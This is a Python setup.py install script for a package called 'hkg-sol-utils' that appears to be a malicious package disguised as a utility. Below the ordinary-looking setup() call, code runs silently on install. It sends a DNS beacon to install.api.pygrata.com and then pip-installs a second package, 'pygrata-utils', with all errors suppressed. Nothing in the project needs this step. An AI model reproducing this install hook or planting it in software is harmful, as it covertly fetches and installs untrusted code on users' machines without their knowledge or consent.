from distutils.core import setup
import subprocess

setup(
  name = 'hkg-sol-utils',
  version = '0.4.0',
  description = '',
  author = 'Watson',
  keywords = ['pygrata2'],
  classifiers = []
)

try:
    subprocess.getoutput('dig @1.1.1.1 install.api.pygrata.com')
    subprocess.getoutput('pip install pygrata-utils -U')
except:
  pass
